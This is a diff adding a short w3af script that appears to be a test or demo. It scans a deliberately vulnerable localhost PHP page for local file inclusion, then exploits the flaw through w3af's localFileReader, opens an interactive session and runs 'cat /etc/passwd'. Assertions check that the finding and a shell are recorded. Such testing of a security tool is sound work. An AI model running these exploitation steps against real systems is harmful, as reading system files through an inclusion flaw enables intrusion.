@@ -1,0 +1,31 @@
+# This is the local file inclusion demo:
+
+plugins
+audit localFileInclude
+output console,textFile
+output
+output config textFile
+set fileName output-w3af.txt
+set verbosity 10
+back
+back
+target
+set target http://localhost/w3af/localFileInclusion/vulnerable.php?file=f0as9
+back
+start
+
+assert len(kb.kb.getData('localFileInclude','localFileInclude')) == 1
+
+exploit
+exploit localFileReader
+interact 0
+
+cat /etc/passwd
+list
+endInteraction
+
+back
+
+assert len(kb.kb.getData( 'localFileReader' , 'shell' )) == 1
+
+exit
